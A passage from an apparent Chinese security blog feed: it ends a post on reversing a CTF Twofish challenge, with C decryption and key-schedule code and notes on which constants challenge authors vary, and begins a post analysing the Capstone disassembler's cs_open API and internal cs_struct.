class="keyword">uint8_t</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> r0, r1, r2, r3, f0, f1, c2,c3;</span><br><span class="line">    <span class="comment">/* Input Whitenening */</span></span><br><span class="line">    r0 = tf_twofish-&gt;k[<span class="number">4</span>]^pack(cypher);</span><br><span class="line">    r1 = tf_twofish-&gt;k[<span class="number">5</span>]^pack(cypher+<span class="number">4</span>);</span><br><span class="line">    r2 = tf_twofish-&gt;k[<span class="number">6</span>]^pack(cypher+<span class="number">8</span>);</span><br><span class="line">    r3 = tf_twofish-&gt;k[<span class="number">7</span>]^pack(cypher+<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The black box */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">15</span>; i &gt;= <span class="number">0</span>;--i)</span><br><span class="line">    &#123;</span><br><span class="line">        Twofish_f(tf_twofish, i, r0, r1, &amp;f0, &amp;f1);</span><br><span class="line">        c2 = (rol(r2,<span class="number">1</span>)^f0);</span><br><span class="line">        c3 = ror((f1^r3),<span class="number">1</span>);</span><br><span class="line">        <span class="comment">/* swap */</span></span><br><span class="line">        r2 = r0;</span><br><span class="line">        r3 = r1;</span><br><span class="line">        r0 = c2;</span><br><span class="line">        r1 = c3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Output Whitening */</span></span><br><span class="line">    c2 = r0;</span><br><span class="line">    c3 = r1;</span><br><span class="line">    r0 = tf_twofish-&gt;k[<span class="number">0</span>]^r2;</span><br><span class="line">    r1 = tf_twofish-&gt;k[<span class="number">1</span>]^r3;</span><br><span class="line">    r2 = tf_twofish-&gt;k[<span class="number">2</span>]^c2;</span><br><span class="line">    r3 = tf_twofish-&gt;k[<span class="number">3</span>]^c3;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        data[i]   = unpack(r0,i);</span><br><span class="line">        data[i+<span class="number">4</span>] = unpack(r1,i);</span><br><span class="line">        data[i+<span class="number">8</span>] = unpack(r2,i);</span><br><span class="line">        data[i+<span class="number">12</span>]= unpack(r3,i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_f</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> r,<span class="keyword">uint32_t</span> r0, <span class="keyword">uint32_t</span> r1, <span class="keyword">uint32_t</span>* f0, <span class="keyword">uint32_t</span>* f1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> t0, t1, o;</span><br><span class="line">    t0 = Twofish_g(tf_twofish, r0);</span><br><span class="line">    t1 = rol(r1, <span class="number">8</span>);</span><br><span class="line">    t1 = Twofish_g(tf_twofish, t1);</span><br><span class="line">    o = <span class="number">2</span>*r;</span><br><span class="line">    *f0= (t0 + t1 + tf_twofish-&gt;k[o+<span class="number">8</span>]);</span><br><span class="line">    *f1= (t0 + (<span class="number">2</span>*t1) + tf_twofish-&gt;k[o+<span class="number">9</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">twofish_t</span>* <span class="title">Twofish_generate_ext_k_keys</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">subkey_t</span> *tf_subkey,<span class="keyword">uint32_t</span> p, <span class="keyword">uint8_t</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> a, b;</span><br><span class="line">    <span class="keyword">uint8_t</span> x[<span class="number">4</span>], y[<span class="number">4</span>], z[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">40</span>;i+=<span class="number">2</span>)                  <span class="comment">/* i = 40/2 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        a = (i*p);                          <span class="comment">/* 2*i*p */</span></span><br><span class="line">        b = (a+p);                          <span class="comment">/* ((2*i +1)*p */</span></span><br><span class="line">        u(x,a);</span><br><span class="line">        Twofish_h(x, y, tf_subkey-&gt;me, k);</span><br><span class="line">        Twofish_mds_mul(y,z);</span><br><span class="line">        a = pack(z);                        <span class="comment">/* Convert four bytes z[4] to a word (a). */</span></span><br><span class="line">        u(x,b);                             <span class="comment">/* Convert a word (b) to four bytes x[4]. */</span></span><br><span class="line">        Twofish_h(x, y, tf_subkey-&gt;mo, k);</span><br><span class="line">        Twofish_mds_mul(y,z);        </span><br><span class="line">        b = pack(z);</span><br><span class="line">        b = rol(b,<span class="number">8</span>);</span><br><span class="line">        tf_twofish-&gt;k[i] = ((a + b));</span><br><span class="line">        tf_twofish-&gt;k[i+<span class="number">1</span>] = rol(((a + (<span class="number">2</span>*b))),<span class="number">9</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tf_twofish;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">twofish_t</span>* <span class="title">Twofish_generate_ext_s_keys</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">subkey_t</span> *tf_subkey, <span class="keyword">uint8_t</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> x[<span class="number">4</span>], y[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        x[<span class="number">0</span>] = x[<span class="number">1</span>] = x[<span class="number">2</span>] = x[<span class="number">3</span>] = i;</span><br><span class="line">        Twofish_h(x, y, tf_subkey-&gt;s, k);</span><br><span class="line">        <span class="comment">/* Special MDS multiplication */</span></span><br><span class="line">        tf_twofish-&gt;s[<span class="number">0</span>][i] = (gf(y[<span class="number">0</span>], mds[<span class="number">0</span>][<span class="number">0</span>],<span class="number">0x169</span>) |(gf(y[<span class="number">1</span>],mds[<span class="number">0</span>][<span class="number">1</span>],<span class="number">0x169</span>)&lt;&lt; <span class="number">8</span>)|(gf(y[<span class="number">2</span>], mds[<span class="number">0</span>][<span class="number">2</span>],<span class="number">0x169</span>)&lt;&lt;<span class="number">16</span>) |(gf(y[<span class="number">3</span>], mds[<span class="number">0</span>][<span class="number">3</span>], <span class="number">0x169</span>) &lt;&lt;<span class="number">24</span>));</span><br><span class="line">        tf_twofish-&gt;s[<span class="number">1</span>][i] = (gf(y[<span class="number">0</span>], mds[<span class="number">1</span>][<span class="number">0</span>],<span class="number">0x169</span>) |(gf(y[<span class="number">1</span>],mds[<span class="number">1</span>][<span class="number">1</span>],<span class="number">0x169</span>)&lt;&lt; <span class="number">8</span>)|(gf(y[<span class="number">2</span>], mds[<span class="number">1</span>][<span class="number">2</span>],<span class="number">0x169</span>)&lt;&lt;<span class="number">16</span>) |(gf(y[<span class="number">3</span>], mds[<span class="number">1</span>][<span class="number">3</span>], <span class="number">0x169</span>) &lt;&lt;<span class="number">24</span>));</span><br><span class="line">        tf_twofish-&gt;s[<span class="number">2</span>][i] = (gf(y[<span class="number">0</span>], mds[<span class="number">2</span>][<span class="number">0</span>],<span class="number">0x169</span>) |(gf(y[<span class="number">1</span>],mds[<span class="number">2</span>][<span class="number">1</span>],<span class="number">0x169</span>)&lt;&lt; <span class="number">8</span>)|(gf(y[<span class="number">2</span>], mds[<span class="number">2</span>][<span class="number">2</span>],<span class="number">0x169</span>)&lt;&lt;<span class="number">16</span>) |(gf(y[<span class="number">3</span>], mds[<span class="number">2</span>][<span class="number">3</span>], <span class="number">0x169</span>) &lt;&lt;<span class="number">24</span>));</span><br><span class="line">        tf_twofish-&gt;s[<span class="number">3</span>][i] = (gf(y[<span class="number">0</span>], mds[<span class="number">3</span>][<span class="number">0</span>],<span class="number">0x169</span>) |(gf(y[<span class="number">1</span>],mds[<span class="number">3</span>][<span class="number">1</span>],<span class="number">0x169</span>)&lt;&lt; <span class="number">8</span>)|(gf(y[<span class="number">2</span>], mds[<span class="number">3</span>][<span class="number">2</span>],<span class="number">0x169</span>)&lt;&lt;<span class="number">16</span>) |(gf(y[<span class="number">3</span>], mds[<span class="number">3</span>][<span class="number">3</span>], <span class="number">0x169</span>) &lt;&lt;<span class="number">24</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tf_twofish;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_mds_mul</span><span class="params">(<span class="keyword">uint8_t</span> y[],  <span class="keyword">uint8_t</span> out[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* MDS multiplication */</span></span><br><span class="line">    out[<span class="number">0</span>] = (gf(y[<span class="number">0</span>], mds[<span class="number">0</span>][<span class="number">0</span>], <span class="number">0x169</span>)^gf(y[<span class="number">1</span>], mds[<span class="number">0</span>][<span class="number">1</span>], <span class="number">0x169</span>)^gf(y[<span class="number">2</span>], mds[<span class="number">0</span>][<span class="number">2</span>], <span class="number">0x169</span>)^gf(y[<span class="number">3</span>], mds[<span class="number">0</span>][<span class="number">3</span>], <span class="number">0x169</span>));</span><br><span class="line">    out[<span class="number">1</span>] = (gf(y[<span class="number">0</span>], mds[<span class="number">1</span>][<span class="number">0</span>], <span class="number">0x169</span>)^gf(y[<span class="number">1</span>], mds[<span class="number">1</span>][<span class="number">1</span>], <span class="number">0x169</span>)^gf(y[<span class="number">2</span>], mds[<span class="number">1</span>][<span class="number">2</span>], <span class="number">0x169</span>)^gf(y[<span class="number">3</span>], mds[<span class="number">1</span>][<span class="number">3</span>], <span class="number">0x169</span>));</span><br><span class="line">    out[<span class="number">2</span>] = (gf(y[<span class="number">0</span>], mds[<span class="number">2</span>][<span class="number">0</span>], <span class="number">0x169</span>)^gf(y[<span class="number">1</span>], mds[<span class="number">2</span>][<span class="number">1</span>], <span class="number">0x169</span>)^gf(y[<span class="number">2</span>], mds[<span class="number">2</span>][<span class="number">2</span>], <span class="number">0x169</span>)^gf(y[<span class="number">3</span>], mds[<span class="number">2</span>][<span class="number">3</span>], <span class="number">0x169</span>));</span><br><span class="line">    out[<span class="number">3</span>] = (gf(y[<span class="number">0</span>], mds[<span class="number">3</span>][<span class="number">0</span>], <span class="number">0x169</span>)^gf(y[<span class="number">1</span>], mds[<span class="number">3</span>][<span class="number">1</span>], <span class="number">0x169</span>)^gf(y[<span class="number">2</span>], mds[<span class="number">3</span>][<span class="number">2</span>], <span class="number">0x169</span>)^gf(y[<span class="number">3</span>], mds[<span class="number">3</span>][<span class="number">3</span>], <span class="number">0x169</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">Twofish_g</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint32_t</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (tf_twofish-&gt;s[<span class="number">0</span>][unpack(x,<span class="number">0</span>)]^tf_twofish-&gt;s[<span class="number">1</span>][unpack(x, <span class="number">1</span>)]^tf_twofish-&gt;s[<span class="number">2</span>][unpack(x,<span class="number">2</span>)]^tf_twofish-&gt;s[<span class="number">3</span>][unpack(x,<span class="number">3</span>)]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_h</span><span class="params">(<span class="keyword">uint8_t</span> x[],  <span class="keyword">uint8_t</span> out[], <span class="keyword">uint8_t</span> s[][<span class="number">4</span>], <span class="keyword">int</span> stage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> y[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;<span class="number">4</span>;++j)</span><br><span class="line">    &#123;</span><br><span class="line">        y[j] = x[j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stage == <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        y[<span class="number">0</span>] = q[<span class="number">1</span>][y[<span class="number">0</span>]] ^ (s[<span class="number">3</span>][<span class="number">0</span>]);</span><br><span class="line">        y[<span class="number">1</span>] = q[<span class="number">0</span>][y[<span class="number">1</span>]] ^ (s[<span class="number">3</span>][<span class="number">1</span>]);</span><br><span class="line">        y[<span class="number">2</span>] = q[<span class="number">0</span>][y[<span class="number">2</span>]] ^ (s[<span class="number">3</span>][<span class="number">2</span>]);</span><br><span class="line">        y[<span class="number">3</span>] = q[<span class="number">1</span>][y[<span class="number">3</span>]] ^ (s[<span class="number">3</span>][<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stage &gt; <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        y[<span class="number">0</span>] = q[<span class="number">1</span>][y[<span class="number">0</span>]] ^ (s[<span class="number">2</span>][<span class="number">0</span>]);</span><br><span class="line">        y[<span class="number">1</span>] = q[<span class="number">1</span>][y[<span class="number">1</span>]] ^ (s[<span class="number">2</span>][<span class="number">1</span>]);</span><br><span class="line">        y[<span class="number">2</span>] = q[<span class="number">0</span>][y[<span class="number">2</span>]] ^ (s[<span class="number">2</span>][<span class="number">2</span>]);</span><br><span class="line">        y[<span class="number">3</span>] = q[<span class="number">0</span>][y[<span class="number">3</span>]] ^ (s[<span class="number">2</span>][<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    out[<span class="number">0</span>] = q[<span class="number">1</span>][q[<span class="number">0</span>][ q[<span class="number">0</span>][y[<span class="number">0</span>]] ^ (s[<span class="number">1</span>][<span class="number">0</span>])] ^ (s[<span class="number">0</span>][<span class="number">0</span>])];</span><br><span class="line">    out[<span class="number">1</span>] = q[<span class="number">0</span>][q[<span class="number">0</span>][ q[<span class="number">1</span>][y[<span class="number">1</span>]] ^ (s[<span class="number">1</span>][<span class="number">1</span>])] ^ (s[<span class="number">0</span>][<span class="number">1</span>])];</span><br><span class="line">    out[<span class="number">2</span>] = q[<span class="number">1</span>][q[<span class="number">1</span>][ q[<span class="number">0</span>][y[<span class="number">2</span>]] ^ (s[<span class="number">1</span>][<span class="number">2</span>])] ^ (s[<span class="number">0</span>][<span class="number">2</span>])];</span><br><span class="line">    out[<span class="number">3</span>] = q[<span class="number">0</span>][q[<span class="number">1</span>][ q[<span class="number">1</span>][y[<span class="number">3</span>]] ^ (s[<span class="number">1</span>][<span class="number">3</span>])] ^ (s[<span class="number">0</span>][<span class="number">3</span>])];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">subkey_t</span>* <span class="title">Twofish_generate_subkey</span><span class="params">(<span class="keyword">key_t</span>* tf_key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> k, r, g;</span><br><span class="line">    <span class="keyword">subkey_t</span> *tf_subkey = (<span class="keyword">subkey_t</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">subkey_t</span>));</span><br><span class="line">    k = tf_key-&gt;len/<span class="number">8</span>;                                  <span class="comment">/* k=N/64 */</span></span><br><span class="line">    <span class="keyword">for</span>(r=<span class="number">0</span>; r&lt;k;++r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Generate subkeys Me and Mo */</span></span><br><span class="line">        tf_subkey-&gt;me[r][<span class="number">0</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span>    );</span><br><span class="line">        tf_subkey-&gt;me[r][<span class="number">1</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">1</span>);</span><br><span class="line">        tf_subkey-&gt;me[r][<span class="number">2</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">2</span>);</span><br><span class="line">        tf_subkey-&gt;me[r][<span class="number">3</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">3</span>);</span><br><span class="line">        tf_subkey-&gt;mo[r][<span class="number">0</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">4</span>);</span><br><span class="line">        tf_subkey-&gt;mo[r][<span class="number">1</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">5</span>);</span><br><span class="line">        tf_subkey-&gt;mo[r][<span class="number">2</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">6</span>);</span><br><span class="line">        tf_subkey-&gt;mo[r][<span class="number">3</span>] = nxt(tf_key-&gt;k, r*<span class="number">8</span> + <span class="number">7</span>);</span><br><span class="line">        </span><br><span class="line">        g=k-r<span class="number">-1</span>;                                        <span class="comment">/* Reverse order */</span></span><br><span class="line">        <span class="comment">/* Generate subkeys S using RS matrix */</span></span><br><span class="line">        tf_subkey-&gt;s[g][<span class="number">0</span>] = rsm(r, <span class="number">0x01</span>, <span class="number">0xa4</span>, <span class="number">0x55</span>, <span class="number">0x87</span>, <span class="number">0x5a</span>, <span class="number">0x58</span>, <span class="number">0xdb</span>, <span class="number">0x9e</span>);</span><br><span class="line">        tf_subkey-&gt;s[g][<span class="number">1</span>] = rsm(r, <span class="number">0xa4</span>, <span class="number">0x56</span>, <span class="number">0x82</span>, <span class="number">0xf3</span>, <span class="number">0x1e</span>, <span class="number">0xc6</span>, <span class="number">0x68</span>, <span class="number">0xe5</span>);</span><br><span class="line">        tf_subkey-&gt;s[g][<span class="number">2</span>] = rsm(r, <span class="number">0x02</span>, <span class="number">0xa1</span>, <span class="number">0xfc</span>, <span class="number">0xc1</span>, <span class="number">0x47</span>, <span class="number">0xae</span>, <span class="number">0x3d</span>, <span class="number">0x19</span>);</span><br><span class="line">        tf_subkey-&gt;s[g][<span class="number">3</span>] = rsm(r, <span class="number">0xa4</span>, <span class="number">0x55</span>, <span class="number">0x87</span>, <span class="number">0x5a</span>, <span class="number">0x58</span>, <span class="number">0xdb</span>, <span class="number">0x9e</span>, <span class="number">0x03</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tf_subkey;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">key_t</span>* <span class="title">expand_key</span><span class="params">(<span class="keyword">uint8_t</span> *s, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="comment">/* Pad factor */</span></span><br><span class="line">    <span class="keyword">if</span> (len&lt;<span class="number">16</span>)       n = <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (len&lt;<span class="number">24</span>)  n = <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (len&lt;<span class="number">32</span>)  n = <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">key_t</span>* tf_key = (<span class="keyword">key_t</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">key_t</span>));</span><br><span class="line">    <span class="keyword">uint8_t</span>* ss = (<span class="keyword">uint8_t</span>*)<span class="built_in">malloc</span>(n);</span><br><span class="line">    <span class="comment">/* Do actual padding. */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> g=<span class="number">0</span>; g&lt;n; ++g)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (g &lt; len)</span><br><span class="line">        &#123;</span><br><span class="line">            *(ss+g) = *(s+g);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *(ss+g) = <span class="number">0x00</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tf_key-&gt;k = ss;</span><br><span class="line">    tf_key-&gt;len=n;</span><br><span class="line">    <span class="keyword">return</span> tf_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> <span class="title">gf</span><span class="params">(<span class="keyword">uint8_t</span> x, <span class="keyword">uint8_t</span> y, <span class="keyword">uint16_t</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> c, p = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (y &amp; <span class="number">0x1</span>)</span><br><span class="line">            p ^= x;</span><br><span class="line">        c = x &amp; <span class="number">0x80</span>;</span><br><span class="line">        x &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (c)</span><br><span class="line">            x ^= m;</span><br><span class="line">        y &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>写一个main函数直接调用即可。</p><h2 id="CTF出题变化分析"><a href="#CTF出题变化分析" class="headerlink" title="CTF出题变化分析"></a>CTF出题变化分析</h2><p>TwoFish算法共有三处可发生变化以提高出题难度</p><ol><li>rsm函数，0x14d可替换为其他数字</li><li>Twofish_generate_ext_s_keys函数中gf的参数0x166可替换</li><li>Twofish_mds_mul函数中gf的参数0x166可替换</li></ol><p>对于这类分组加密算法，即使插件没有识别，只要看出相关函数结构，就可以很快确定具体算法，找到可能变化的参数，相应修改解密函数即可</p><p>附件中附上了题目和idb文件供自行分析</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;逆向分析加解密之TwoFish算法&quot;&gt;&lt;a href=&quot;#逆向分析加解密之TwoFish算法&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="TwoFish算法" scheme="https://kabeor.github.io/tags/TwoFish%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Capstone反汇编引擎数据类型及API分析及示例(三)</title>
    <link href="https://kabeor.github.io/Capstone%E5%8F%8D%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E5%8F%8A%E7%A4%BA%E4%BE%8B(%E4%B8%89)/"/>
    <id>https://kabeor.github.io/Capstone%E5%8F%8D%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E5%8F%8A%E7%A4%BA%E4%BE%8B(%E4%B8%89)/</id>
    <published>2019-07-28T16:00:00.000Z</published>
    <updated>2020-03-16T04:39:16.762Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Capstone反汇编引擎数据类型及API分析及示例-三"><a href="#Capstone反汇编引擎数据类型及API分析及示例-三" class="headerlink" title="Capstone反汇编引擎数据类型及API分析及示例(三)"></a>Capstone反汇编引擎数据类型及API分析及示例(三)</h1><blockquote><p>本文由本人首发于先知社区 <a href="https://xz.aliyun.com/t/5772" target="_blank" rel="noopener">https://xz.aliyun.com/t/5772</a></p></blockquote><h2 id="API分析"><a href="#API分析" class="headerlink" title="API分析"></a>API分析</h2><h3 id="cs-open"><a href="#cs-open" class="headerlink" title="cs_open"></a>cs_open</h3><p><code>cs_err CAPSTONE_API cs_open(cs_arch arch, cs_mode mode, csh *handle);</code></p><p>初始化cs句柄</p><p>参数<br>arch: 架构类型 (CS_ARCH_<em>)<br>mode: 硬件模式. CS_MODE_</em>在cs_mode数据类型中可查<br>handle: 指向句柄, 返回时更新<br>return: 创建成功返回CS_ERR_OK，否则返回cs_err枚举中对应的错误信息</p><p>实现代码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">cs_err CAPSTONE_API <span class="title">cs_open</span><span class="params">(cs_arch arch, cs_mode mode, csh *handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">ud</span>;</span></span><br><span class="line"><span class="keyword">if</span> (!cs_mem_malloc || !cs_mem_calloc || !cs_mem_realloc || !cs_mem_free || !cs_vsnprintf)</span><br><span class="line"><span class="comment">// Error: 使用cs_open()前, 必须使用cs_option(CS_OPT_MEM)进行动态内存管理的初始化</span></span><br><span class="line"><span class="keyword">return</span> CS_ERR_MEMSETUP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (arch &lt; CS_ARCH_MAX &amp;&amp; cs_arch_init[arch]) &#123;</span><br><span class="line"><span class="comment">// 验证架构是否使用，方式：架构在枚举中且可初始化</span></span><br><span class="line"><span class="keyword">if</span> (mode &amp; cs_arch_disallowed_mode_mask[arch]) &#123;</span><br><span class="line">*handle = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_MODE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ud = cs_mem_calloc(<span class="number">1</span>, <span class="keyword">sizeof</span>(*ud));</span><br><span class="line"><span class="keyword">if</span> (!ud) &#123;</span><br><span class="line"><span class="comment">// 内存不足</span></span><br><span class="line"><span class="keyword">return</span> CS_ERR_MEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ud-&gt;errnum = CS_ERR_OK;</span><br><span class="line">ud-&gt;arch = arch;</span><br><span class="line">ud-&gt;mode = mode;</span><br><span class="line"><span class="comment">// 默认情况指令不打开detail模式</span></span><br><span class="line">ud-&gt;detail = CS_OPT_OFF;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认skipdata设置</span></span><br><span class="line">ud-&gt;skipdata_setup.mnemonic = SKIPDATA_MNEM;</span><br><span class="line"></span><br><span class="line">err = cs_arch_init[ud-&gt;arch](ud);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">cs_mem_free(ud);</span><br><span class="line">*handle = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*handle = (<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">*handle = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_ARCH;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>其中，cs_struct结构体包含更多细节设定，如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line">Printer_t printer;<span class="comment">// 打印asm</span></span><br><span class="line"><span class="keyword">void</span> *printer_info; <span class="comment">// 打印信息</span></span><br><span class="line">Disasm_t disasm;<span class="comment">// 反编译</span></span><br><span class="line"><span class="keyword">void</span> *getinsn_info; <span class="comment">// 打印辅助信息</span></span><br><span class="line">GetName_t reg_name;</span><br><span class="line">GetName_t insn_name;</span><br><span class="line">GetName_t group_name;</span><br><span class="line">GetID_t insn_id;</span><br><span class="line">PostPrinter_t post_printer;</span><br><span class="line">cs_err errnum;</span><br><span class="line">ARM_ITStatus ITBlock;<span class="comment">// ARM特殊选项</span></span><br><span class="line">cs_opt_value detail, imm_unsigned;</span><br><span class="line"><span class="keyword">int</span> syntax;<span class="comment">//ARM, Mips &amp; PPC等架构的基本asm语法打印</span></span><br><span class="line"><span class="keyword">bool</span> doing_mem;<span class="comment">// 在InstPrinter代码中处理内存操作数</span></span><br><span class="line"><span class="keyword">unsigned</span> short *insn_cache;<span class="comment">//为mapping.c建立缓存索引</span></span><br><span class="line">GetRegisterName_t get_regname;</span><br><span class="line"><span class="keyword">bool</span> skipdata;<span class="comment">// 如果反编译时要跳过数据，该项设置为True</span></span><br><span class="line"><span class="keyword">uint8_t</span> skipdata_size;<span class="comment">//要跳过bytes的数量</span></span><br><span class="line">cs_opt_skipdata skipdata_setup;<span class="comment">// 自定义skipdata设置</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span> *regsize_map;<span class="comment">//映射register大小 (目前仅支持x86)</span></span><br><span class="line">GetRegisterAccess_t reg_access;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">insn_mnem</span> *<span class="title">mnem_list</span>;</span><span class="comment">// 自定义指令助记符的链接list</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><p>示例(创建一个x86_64类型的cs句柄)：<br><code>cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)</code></p><h3 id="cs-close"><a href="#cs-close" class="headerlink" 